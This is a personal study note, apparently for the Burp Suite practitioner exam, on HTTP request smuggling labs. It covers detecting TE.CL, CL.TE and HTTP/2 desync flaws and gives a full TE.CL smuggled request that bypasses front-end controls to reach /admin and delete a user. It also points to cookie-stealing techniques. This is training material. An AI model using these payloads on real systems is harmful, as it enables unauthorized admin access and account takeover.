
Actually, this is stage 1 or 2 because can use these to get carlos's session cookie (stage 1) and get admin's cookie or admin panel (stage 2).

![[HTTP Request Smuggling (Stage 2)-20260222164701525.png]]

Admin is blocked

Http Request Smuggler > Smuggle Probe **Only on `GET /` request**
Possible HTTP Request Smuggling: TE.CL multiCase （delayed response）
- [[TE.CL#1.4. Lab Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability ⭕️]]

```
POST / HTTP/1.1
Host: 0a31007604b5b2c080bd2bda00e9008d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

![[HTTP Request Smuggling (Stage 2)-20260222164637024.png]]

Change from `/admin` to `/admin/delete?username=carlos` will require to change the `71` to `88` or whatever the hex number is when you highlight the smuggled request.


---
![[HTTP Request Smuggling (Stage 2)-20260222165701891.png]]
HTTP Request Smuggler > HTTP/2 Probe > revealed to be vulnerable to **HTTP/2 TE desync**.
HTTP/2 TE desync v10a options
cookie stealer - [[HTTP2#1.8. Lab Response queue poisoning via H2.TE request smuggling ⭕️]]
cookie stealer - [[HTTP2#1.10. Lab HTTP/2 request smuggling via CRLF injection ⭕️]]


---

Possible HTTP Request Smuggling: CL.TE options （delayed response）
- **Bypass Admin (Stage 2)** [[CL.TE#1.3. Lab Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability ⭕️]]
- https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main?tab=readme-ov-file#clte-multicase---admin-blocked


